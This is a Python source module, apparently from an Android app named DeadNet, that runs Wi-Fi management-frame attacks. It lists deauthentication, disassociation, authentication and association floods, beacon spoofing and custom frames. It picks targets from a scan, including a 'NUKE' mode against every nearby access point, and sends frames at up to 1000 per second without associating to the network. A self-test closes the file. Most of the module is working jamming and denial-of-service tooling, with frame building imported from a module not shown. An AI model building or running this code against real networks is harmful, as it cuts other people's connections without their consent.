"""
Attack (v3 M3) — selection -> scheduled mgmt-TX for the own-the-PHY app.

This is the v3 home of the attack path. It lifts the proven pieces out of
`phycycle.py` (scheduler + selection + spoof-set ordering) into a focused module
so `phycycle.py` can be retired, and adds a target adapter from the Recon
inventory (`engine/recon.py`) into the mgmt-TX target model.

Flow, per the v3 operator workflow:

    RECON inventory  ──select(spec)──►  spoof set  ──run(mode)──►  scheduled
    (recon.Target)                      (MgmtTarget)               mgmt-TX burst

Attack needs **no association / no credentials**: it drives `MgmtTxController`
against an UNASSOCIATED managed vif (PhyGuard's ATTACK mode). `ensure_attack`
is the hook the caller uses to (re)assert that mode before a burst.

Frame building is byte-identical to the PoC via `engine/mgmt_tx.py`; the
scheduler and selection helpers are pure and unit-testable off-device.

Stdlib only: fnmatch, re, threading, time.
"""
from __future__ import annotations

import fnmatch
import os
import re
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from engine.mgmt_tx import (  # noqa: E402
    BC, DEFAULT_FREQ, MgmtCtx, MgmtTarget, bld_nuke, build_frame, fr, norm_mac,
)

try:
    from kivy.logger import Logger
except Exception:  # off-device / bare test env
    class _L:  # noqa: D101
        def info(self, *a, **k): pass
        def error(self, *a, **k): pass
        def warning(self, *a, **k): pass
    Logger = _L()

DEADNET_PREF = "DeadNet"

MIN_PPS, MAX_PPS = 10, 1000
RE_CHARS_RE = re.compile(r"[.^$+|(){}]")  # regex-only metachars -> ERE matcher

# attack catalogue (mode id -> human label); 12 = custom hex, 0/NUKE = wildcard
ATTACK_MODES: Dict[int, str] = {
    1: "deauth (broadcast, from AP)",
    2: "deauth (directed, AP<->sta)",
    3: "disassoc (broadcast, from AP)",
    4: "disassoc (directed, AP<->sta)",
    5: "probe-request flood",
    6: "auth flood",
    7: "assoc-request flood",
    8: "public action (cat 04)",
    9: "vendor action (cat 7f)",
    10: "non-public action (cat 00)",
    11: "beacon / probe-resp spoof",
    12: "custom hex frame",
}


# ---------------------------------------------------------------------------
# target adapter: recon inventory -> mgmt-TX target model
# ---------------------------------------------------------------------------
def recon_freq(t) -> int:
    """Best-effort MHz for a recon Target (freq, else channel)."""
    f = int(getattr(t, "freq", 0) or 0)
    if f:
        return f
    ch = int(getattr(t, "channel", 0) or 0)
    if ch:
        try:
            from engine.recon import channel_to_freq
            return channel_to_freq(ch)
        except Exception:  # noqa: BLE001
            return 0
    return 0


def from_recon(t) -> MgmtTarget:
    """Adapt a `recon.Target` (colon MAC) to a `MgmtTarget` (colonless)."""
    mac = norm_mac(getattr(t, "mac", ""))
    kind = (getattr(t, "kind", "ap") or "ap").lower()
    typ = "ap" if kind == "ap" else "station"
    ssid = getattr(t, "ssid", "") or ""
    label = ssid or getattr(t, "vendor", "") or mac
    return MgmtTarget(mac=mac, typ=typ, freq=recon_freq(t), label=label, ssid=ssid)


# ---------------------------------------------------------------------------
# selection helpers (pure)
# ---------------------------------------------------------------------------
def split_pattern(sel: str) -> Tuple[str, bool]:
    """`S<pat>` / `S~<ere>` -> (pattern, force_regex)."""
    pat = sel[1:]
    force_re = False
    if pat.startswith("~"):
        force_re, pat = True, pat[1:]
    elif RE_CHARS_RE.search(pat):
        force_re = True
    return pat, force_re


def match_ssids(targets: List[MgmtTarget], pat: str, force_re: bool) -> List[int]:
    """Return 1-based ids of targets whose SSID matches. Never raises."""
    hits: List[int] = []
    try:
        if force_re:
            try:
                rx = re.compile(pat)
            except re.error as exc:
                Logger.error(f"{DEADNET_PREF}: bad regex {pat!r}: {exc}")
                return []
            for i, t in enumerate(targets):
                if t.ssid and rx.search(t.ssid):
                    hits.append(i + 1)
        else:
            for i, t in enumerate(targets):
                if t.ssid and fnmatch.fnmatchcase(t.ssid, pat):
                    hits.append(i + 1)
    except Exception:  # noqa: BLE001
        return []
    return hits


def parse_indices(spec: str) -> List[int]:
    """'1,3,5' / '2 4' -> [1,3,5,2,4] (order-preserving, ints only)."""
    out: List[int] = []
    for tok in re.split(r"[,\s]+", (spec or "").strip()):
        if not tok:
            continue
        try:
            out.append(int(tok))
        except ValueError:
            continue
    return out


def sort_spoof_set(spoof: List[MgmtTarget]) -> None:
    """Channel-sticky ordering: group by freq so the radio does not thrash."""
    spoof.sort(key=lambda t: (t.freq, t.mac))


def select_spoof(targets: List[MgmtTarget], spec: str,
                 default_freq: int = DEFAULT_FREQ) -> List[MgmtTarget]:
    """Resolve a selection spec against `targets` into an ordered spoof set.

    Spec forms: '3' | '1,3,5' | 'S<glob>' | 'S~<ere>' | 'all'. Returns [] on
    no match. Frequencies fall back to `default_freq` when unknown.
    """
    spec = (spec or "").strip()
    hits: List[int] = []
    if spec.lower() == "all":
        hits = list(range(1, len(targets) + 1))
    elif spec[:1] in ("S", "s"):
        pat, force_re = split_pattern(spec)
        if not pat:
            return []
        hits = match_ssids(targets, pat, force_re)
    else:
        hits = parse_indices(spec)

    seen = set()
    out: List[MgmtTarget] = []
    for xi in hits:
        if xi < 1 or xi > len(targets) or xi in seen:
            continue
        seen.add(xi)
        t = targets[xi - 1]
        out.append(MgmtTarget(t.mac, t.typ, t.freq or default_freq, t.label, t.ssid))
    sort_spoof_set(out)
    return out


def build_spoof_set(targets: List[MgmtTarget], scope: str,
                    own_bssid: str = "", own_freq: int = 0) -> List[MgmtTarget]:
    """NUKE spoof set: every AP ('all'), just ours ('own'), or one MAC.

    Keeps the current set (returns []) when nothing matches.
    """
    scope = (scope or "all").strip()
    freq_default = own_freq or DEFAULT_FREQ
    new: List[MgmtTarget] = []
    if scope == "all":
        for t in targets:
            if t.typ != "ap":
                continue
            new.append(MgmtTarget(t.mac, "ap", t.freq or freq_default, t.label, t.ssid))
        if not new and own_bssid:
            new.append(MgmtTarget(norm_mac(own_bssid), "ap", freq_default, "associated AP", ""))
    elif scope == "own":
        if own_bssid:
            new.append(MgmtTarget(norm_mac(own_bssid), "ap", freq_default, "associated AP", ""))
    else:
        m = norm_mac(scope)
        if m:
            new.append(MgmtTarget(m, "ap", freq_default, "scope MAC", ""))
    new = [t for t in new if t.mac]
    if not new:
        return []
    sort_spoof_set(new)
    return new


# ---------------------------------------------------------------------------
# scheduler engine — deadline-paced rotation over the spoof set
# ---------------------------------------------------------------------------
SendFn = Callable[[str, int, str, bool], Tuple[bool, bool]]
BuildFn = Callable[[int, MgmtTarget, int], str]


def sched_builder(mode: int, ctx: MgmtCtx) -> BuildFn:
    def _b(idx: int, tgt: MgmtTarget, tog: int) -> str:
        _, hx = build_frame(mode, tgt, ctx)
        return hx
    return _b


def nuke_builder() -> BuildFn:
    def _b(idx: int, tgt: MgmtTarget, tog: int) -> str:
        return bld_nuke(tgt.mac, tog)
    return _b


def sched_run(send_fn: SendFn, iface: str, spoof: List[MgmtTarget],
              budget: int, pps: int, title: str, builder: BuildFn,
              on_tick: Optional[Callable[[dict], None]] = None,
              stop: Optional[threading.Event] = None,
              dry: bool = False) -> Dict[str, int]:
    """Bounded (budget>0) or infinite (budget=0 + stop event) mgmt-TX burst.

    Returns {"sent", "ok", "avg", "target_pps"}. Never raises out.
    """
    pps = max(MIN_PPS, min(MAX_PPS, int(pps or 100)))
    step_us = max(1, 1000000 // pps)
    sent = ok = idx = tog = 0
    t0 = nxt = time.monotonic_ns()
    try:
        while budget == 0 or sent < budget:
            if stop is not None and stop.is_set():
                break
            n = len(spoof)
            if n == 0:
                break
            idx %= n
            tgt = spoof[idx]
            idx += 1          # rotate through the spoof set (channel-sticky order)
            tog ^= 1
            try:
                hexframe = builder(idx, tgt, tog)
            except Exception:  # noqa: BLE001
                hexframe = ""
            accepted = False
            if hexframe:
                if dry:
                    accepted = True
                else:
                    try:
                        accepted, _ = send_fn(iface, tgt.freq, hexframe, True)
                    except Exception:  # noqa: BLE001
                        accepted = False
            if accepted:
                ok += 1
            sent += 1
            if on_tick is not None and sent % max(1, pps) == 0:
                try:
                    on_tick({"sent": sent, "ok": ok, "pps": pps, "title": title})
                except Exception:  # noqa: BLE001
                    pass
            nxt += step_us * 1000
            now = time.monotonic_ns()
            if nxt > now:
                time.sleep((nxt - now) / 1e9)
            else:
                nxt = now  # overrun: resync so a slow frame cannot spiral
    except Exception:  # noqa: BLE001
        pass
    dt = time.monotonic_ns() - t0
    avg = (sent * 1000000000 // dt) if dt > 0 else 0
    return {"sent": sent, "ok": ok, "avg": int(avg), "target_pps": pps}


# ---------------------------------------------------------------------------
# AttackController — ensures ATTACK mode and runs a plan
# ---------------------------------------------------------------------------
@dataclass
class AttackPlan:
    mode: int = 1                 # 1..12, or 0 for NUKE wildcard
    spoof: List[MgmtTarget] = field(default_factory=list)
    iface: str = "wlan0"
    pps: int = 100
    budget: int = 0               # 0 = until stopped
    title: str = "attack"
    nuke: bool = False


class AttackController:
    """Drives a plan through mgmt-TX. `ensure_attack` is called once before a
    live burst so the PHY is in ATTACK mode; `send_fn` is the MgmtTx send."""

    def __init__(self, send_fn: SendFn,
                 ensure_attack: Optional[Callable[[], bool]] = None):
        self.send_fn = send_fn
        self.ensure_attack = ensure_attack

    def run(self, plan: AttackPlan, ctx: MgmtCtx,
            on_tick: Optional[Callable[[dict], None]] = None,
            stop: Optional[threading.Event] = None, dry: bool = False) -> Dict[str, int]:
        if not plan.spoof:
            return {"sent": 0, "ok": 0, "avg": 0, "target_pps": plan.pps}
        if self.ensure_attack is not None and not dry:
            try:
                self.ensure_attack()
            except Exception as exc:  # noqa: BLE001
                Logger.error(f"{DEADNET_PREF}: ensure_attack failed: {exc}")
        builder = nuke_builder() if plan.nuke else sched_builder(plan.mode, ctx)
        return sched_run(self.send_fn, plan.iface, plan.spoof, plan.budget,
                         plan.pps, plan.title, builder, on_tick, stop, dry)


# ---------------------------------------------------------------------------
# Self-test (no device / no root).   cd apk && python3 engine/attack.py
# ---------------------------------------------------------------------------
def _self_test() -> None:
    # adapter: recon Target -> MgmtTarget
    class _T:
        mac = "aa:bb:cc:00:11:22"; kind = "ap"; ssid = "Home"; channel = 36
        freq = 5180; vendor = "TestVendor"
    m = from_recon(_T())
    assert m.mac == "aabbcc001122" and m.typ == "ap" and m.freq == 5180, m
    class _T2:
        mac = "24:3f:75:10:ae:1b"; kind = "station"; ssid = ""; channel = 1
        freq = 0; vendor = "Apple"
    m2 = from_recon(_T2())
    assert m2.typ == "station" and m2.freq == 2412 and m2.label == "Apple", m2
    print("  [1] recon->MgmtTarget adapter (ap/station, freq fallback)  ok")

    targets = [MgmtTarget("aabbcc001122", "ap", 2412, "x", "test_ap_1"),
               MgmtTarget("112233445566", "ap", 2412, "x", "test_ap_2"),
               MgmtTarget("001122334455", "ap", 5745, "x", "The Mill Coffee")]

    # selection: indices, multi (dedup/order/clamp), glob, ERE, all
    assert [t.mac for t in select_spoof(targets, "2")] == ["112233445566"]
    sel = select_spoof(targets, "3,1,3,99")
    assert [t.mac for t in sel] == ["aabbcc001122", "001122334455"], sel  # freq-sorted
    # both matches share freq 2412 -> ordered by MAC within the channel group
    assert [t.mac for t in select_spoof(targets, "Stest_ap_*")] == \
        ["112233445566", "aabbcc001122"]
    assert [t.mac for t in select_spoof(targets, "S~^test_ap_")] == \
        ["112233445566", "aabbcc001122"]
    assert len(select_spoof(targets, "all")) == 3
    assert select_spoof(targets, "Snomatch*") == []
    assert parse_indices("1, 3 5") == [1, 3, 5]
    p, f = split_pattern("S^OH"); assert (p, f) == ("^OH", True)
    print("  [2] selection: indices/multi/glob/ere/all, freq-sorted  ok")

    # custom freq fallback + default
    assert select_spoof([MgmtTarget("aa", "ap", 0, "", "")], "1", default_freq=5745)[0].freq == 5745
    print("  [3] selection freq fallback  ok")

    # NUKE spoof set
    assert len(build_spoof_set(targets, "all")) == 3
    assert [t.mac for t in build_spoof_set(targets, "aabbcc001122")] == ["aabbcc001122"]
    assert build_spoof_set([], "all", own_bssid="c8b4225f9dce", own_freq=5745) \
        and build_spoof_set([], "all", own_bssid="c8:b4:22:5f:9d:ce")[0].mac == "c8b4225f9dce"
    assert build_spoof_set([], "own") == [], "no own bssid -> keep current set"
    print("  [4] NUKE spoof set (all/own/mac, empty keeps set)  ok")

    # scheduler: exact budget accounting + builder wiring
    ctx = MgmtCtx(ap_ctx="", assoc_ssid="s", fake="0a0000000000")
    sent_log = []
    def _send(iface, freq, hx, fast):
        sent_log.append((freq, hx)); return True, False
    spoof = [MgmtTarget("aabbcc001122", "ap", 2412, "a", "x"),
             MgmtTarget("112233445566", "ap", 5745, "b", "y")]
    summary = sched_run(_send, "wlan0", spoof, 20, 500, "t", sched_builder(1, ctx))
    assert summary["sent"] == 20 and summary["ok"] == 20, summary
    assert summary["target_pps"] == 500
    # both channels were used (rotation) and frames are valid hex
    assert len({f for f, _ in sent_log}) == 2
    assert all(len(h) % 2 == 0 and h for _, h in sent_log)
    print("  [5] scheduler: exact budget, rotation, valid frames  ok")

    # AttackController: ensure_attack called once; nuke plan uses nuke builder
    calls = {"ensure": 0}
    ac = AttackController(_send, ensure_attack=lambda: calls.__setitem__("ensure", calls["ensure"] + 1))
    p = AttackPlan(mode=1, spoof=spoof, budget=5, pps=200, title="x")
    r = ac.run(p, ctx)
    assert r["sent"] == 5 and calls["ensure"] == 1, (r, calls)
    nuke_log = []
    ac2 = AttackController(lambda i, f, h, fa: (nuke_log.append(h), (True, False))[1])
    r2 = ac2.run(AttackPlan(mode=0, spoof=spoof, budget=4, pps=200, nuke=True), ctx)
    assert r2["sent"] == 4 and all(h.startswith(("c000", "a000")) for h in nuke_log), nuke_log
    # empty spoof set -> no-op, ensure not called
    calls["ensure"] = 0
    assert ac.run(AttackPlan(spoof=[]), ctx)["sent"] == 0 and calls["ensure"] == 0
    print("  [6] AttackController: ensure_attack once, nuke plan, empty no-op  ok")

    print("ATTACK PASS")


if __name__ == "__main__":
    _self_test()
